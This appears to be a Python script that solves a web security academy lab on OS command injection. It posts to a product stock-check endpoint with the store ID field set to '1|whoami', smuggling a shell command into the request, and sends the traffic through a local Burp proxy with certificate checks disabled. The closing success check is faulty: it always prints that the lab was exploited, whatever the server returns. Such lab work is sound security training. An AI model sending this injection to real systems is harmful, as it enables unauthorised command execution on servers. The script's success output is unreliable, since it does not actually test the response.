# Step 1: importing the libraries.
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Avoid url warnings from showing.

# Step 2: Defining the variables.
burp0_url = "https://0a8d00ca0450476980e55d44001d00e2.web-security-academy.net:443/product/stock" #lab url.

burp0_cookies = {"session": "qzJbYc3wrcd16da5F5RN8joFpZU6qbMQ"} # cookies 

burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://0a8d00ca0450476980e55d44001d00e2.web-security-academy.net/product?productId=1", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://0a8d00ca0450476980e55d44001d00e2.web-security-academy.net", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=1", "Te": "trailers"}

burp0_data = {"productId": "1", "storeId": "1|whoami"}
proxy = {"http": "http://127.0.0.1:8080/", "https" : "http://127.0.0.1:8080/"}

# Step 3: Set the request method and add the request components.
r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, verify=False, proxies=proxy) #request to be sent and its components.
# request components:
# burp0_url: this is the url to be sent on the request.
# burp0_headers: this is the headers to be included in the request.
# cookies: cookies to be included in the request.
# data: these are the data that include the payload to be exploited.
# verify: this is set to prevent the certificate check.
# proxy: used to allow the traffic to be intercepted and passed through the burpsuit.


#Step 4: Add a conditional statement to check if the lab is solved or not.
if '200' or '302':
    print("[+] Lab exploited successfully.")
else:
    print("[-] Lab not successfully exploited.")
